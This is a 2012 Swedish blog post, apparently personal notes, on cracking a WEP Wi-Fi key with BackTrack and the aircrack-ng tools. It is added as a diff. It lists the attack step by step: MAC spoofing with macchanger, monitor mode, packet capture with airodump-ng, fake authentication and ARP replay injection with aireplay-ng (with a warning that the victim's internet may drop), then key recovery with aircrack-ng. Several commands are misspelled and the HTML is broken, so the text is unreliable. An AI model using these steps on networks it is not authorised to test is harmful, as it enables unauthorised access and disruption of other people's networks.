@@ -1,0 +1,57 @@
+---
+title: Backtrack hack wep
+date: 2012-02-11 15:11:44
+tags:
+    
+    - Security
+    
+     
+categories:
+    
+    - Security
+    
+     
+keywords: 
+    
+    - Security
+    
+     
+---
+<p>Att hacka wep är en ganska lätt sak.<br />
+WEP har nämligen ett fel i sig som gör att samlar man på sig tillräckligt många paket så kan man<br />
+från paketen läsa ut vad wep nyckeln är.</p>
+<p>För att gör adet så behöver man först lyssna på en bassation som använder sig av WEP.<br />
+Efter det är det bara att hitta så många paket som man behöver runt 20 000 stycken.<br />
+Man kan även &#8220;lura&#8221; basstaionen så den skickar på paket så man kommer upp i rätt mängd.</p>
+<p>Nedan följer mina antekningar om att knäcka WEP</p>
+<p>hitta stationen och kanalen med airdump.<br />
+Gl;minte at bta mac innan</p>
+<p>macchanger &#8211;mac 00:11:22:33:44:55</p>
+<p>ifconfig wlan1 up</p>
+<pre>
+airomon-zc start wlan1</p>
+</pre>
+<p>nu ska du ha en nic som heter mon0</p>
+<p>Den som vi ska anv&#8217;ndat</p>
+<p>#Borja sniffa fraffiken</p>
+<pre>
+airodump-ng -c channel -w filnamn --bssid macenene mon0 </p>
+</pre>
+<p>#byt ut de saker som behovs for att den ska passa</p>
+<p>#Kolla sa du kan auto mot den</p>
+<pre>
+aireplay-ng -1 0 -a bssid -h 00:11:22:33:44:55 -e essid</p>
+</pre>
+<p>#essid e acces pukten namn ssid<br />
+// du ska se en association successful 🙂 da e allt bra</p>
+<p>#borja lek med den sa vi far lite traffik<br />
+#du vill ha data upp till 10000</p>
+<pre>
+<p>aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 mon0<br />
+</pre>
+<p>#Du ska vi leka lite med acces punkten<br />
+#VAR FORSIKTIG INTERNNET KAN DO HOS DOM NU</p>
+<p>#Nu nar vi har manga paket kan vi testa att knacka wep nyckeln</p>
+<pre>
+<p>aircrack-ng -b (bssid)  filnamn</p>
+</pre>
